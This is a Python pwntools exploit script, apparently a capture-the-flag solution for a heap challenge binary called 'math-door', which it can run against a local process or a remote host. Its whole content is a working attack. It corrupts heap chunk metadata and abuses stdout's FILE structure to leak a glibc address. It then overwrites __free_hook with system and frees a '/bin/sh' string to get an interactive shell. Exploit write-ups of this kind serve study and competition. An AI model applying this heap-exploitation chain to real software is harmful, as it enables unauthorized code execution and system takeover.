#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('math-door')
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def create(p):
    p.sendlineafter(b'Action: \n', b'1')


def delete(p, index: int):
    p.sendlineafter(b'Action: \n', b'2')
    p.sendlineafter(b'Hieroglyph index:\n', str(index).encode())


def add_value(p, index: int, x: int, y: int, z: int):
    value = p64(x) + p64(y) + p64(z)

    p.sendlineafter(b'Action: \n', b'3')
    p.sendlineafter(b'Hieroglyph index:\n', str(index).encode())
    p.sendafter(b'Value to add to hieroglyph:\n', value)


def main():
    p = get_process()

    M = 38

    for _ in range(M):
        create(p)

    delete(p, 2)
    delete(p, 1)
    delete(p, 0)

    add_value(p, 0, 0x50, 0, 0)
    create(p)  # M
    create(p)  # M + 1
    add_value(p, 0, 0xffffffffffffffb0, 0, 0)
    add_value(p, M + 1, 0, 0x421, 0)
    delete(p, 4)

    delete(p, 11)
    delete(p, 12)
    delete(p, 13)
    delete(p, 14)

    add_value(p, 14, 0xfffffffffffffc50, 0, 0)
    create(p)  # M + 2
    create(p)  # M + 3

    add_value(p, M + 1, 0, 0xfffffffffffffc00, 0)
    add_value(p, 13, 0xffffffffffffff00, 0, 0)
    add_value(p, M + 3, 0x290, 0, 0)

    add_value(p, 4, 0xad8, 0, 0)
    create(p)  # M + 4
    create(p)  # M + 5: &stdout + 0x18

    add_value(p, M + 3, 0x1725, 0, 0)
    create(p)  # M + 6: &__free_hook

    add_value(p, M + 5, 0, 0, 0x20)  # read_base, write_base, write_ptr
    p.recvline()

    data = p.recvline()
    index = data.index(b'\x7f') + 1
    glibc_leak = u64(data[index - 6:index].ljust(8, b'\0'))
    p.info(f'Glibc leak: {hex(glibc_leak)}')
    glibc.address = glibc_leak - 0x1ee7e0
    p.success(f'Glibc base address: {hex(glibc.address)}')

    add_value(p, M + 6, glibc.sym.system, 0, 0)
    add_value(p, 25, u64(b'/bin/sh\0'), 0, 0)
    delete(p, 25)
    p.recv(timeout=2)

    p.interactive()


if __name__ == '__main__':
    main()
